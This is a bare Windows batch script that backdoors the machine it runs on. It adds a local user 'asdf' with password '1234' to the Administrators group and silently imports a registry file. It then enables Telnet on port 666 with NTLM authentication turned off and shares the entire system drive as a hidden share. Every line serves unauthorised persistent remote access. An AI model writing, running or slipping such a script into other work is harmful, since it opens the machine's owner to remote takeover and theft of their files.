@echo off
chcp 1251
net user asdf 1234 /add
net localgroup Администраторы asdf /add
regedit.exe /s config.reg
sc config tlntsvr start= auto
tlntadmn config port=666 sec=-NTLM
net start Telnet
net share SYS_DISK$=%SYSTEMDRIVE% > nul
